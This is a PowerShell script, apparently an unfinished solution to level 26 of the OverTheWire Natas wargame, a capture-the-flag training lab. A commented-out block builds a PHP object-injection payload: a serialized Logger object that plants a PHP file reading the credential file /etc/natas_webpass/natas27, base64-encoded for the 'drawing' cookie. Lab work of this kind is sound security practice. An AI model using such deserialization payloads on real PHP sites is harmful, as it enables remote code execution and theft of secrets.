. "../natas_filter.ps1"
. "../getCookieValueFromKey.ps1"

$server = "natas26.natas.labs.overthewire.org"
$server = "localhost:8000"
$url = "http://$server"

$username = "natas26"
$password = "***REMOVED***"

$pair = "${username}:${password}"
$bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
$base64 = [System.Convert]::ToBase64String($bytes)
$authorization = "Basic $base64"

$headers = @{
    "Authorization" = $authorization
    "Content-Type"  = "application/x-www-form-urlencoded"
}
$params = "/?x1=1&x2=2&y1=3&y2=4"
write-host "-------------------------------------------------"
if (Test-Path ".\tmp\natas26_mylog.log" -PathType Leaf) {
    remove-item ".\tmp\natas26_mylog.log"
}
<#
$Text = 'a:5:{s:2:"x1";i:1;s:2:"x2";i:2;s:2:"y1";i:3;s:2:"y2";i:4;s:8:"myobject";O:6:"Logger":3:{s:15:"LoggerlogFile";s:18:"img/mememememe.php";s:15:"LoggerinitMsg";s:0:"";s:15:"LoggerexitMsg";s:62:"<?php echo file_get_contents("/etc/natas_webpass/natas27"); ?>";}}'
$Bytes = [System.Text.Encoding]::ASCII.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
exit;#>

(Invoke-WebRequest -Headers $headers -URI $url -SessionVariable sessVar).Content
exit;
$phpsessid = getCookieValueFromKey -sessVar $sessVar -key "PHPSESSID"
(Invoke-WebRequest -Headers $headers -URI $url -WebSession $sessVar).Content


#Get-Content ".\tmp\natas26_mylog.log"


#$_COOKIE["drawing"] contains base64_encode(serialize($ArrayOfXYPointers))
#serialized means: Can be read as an Object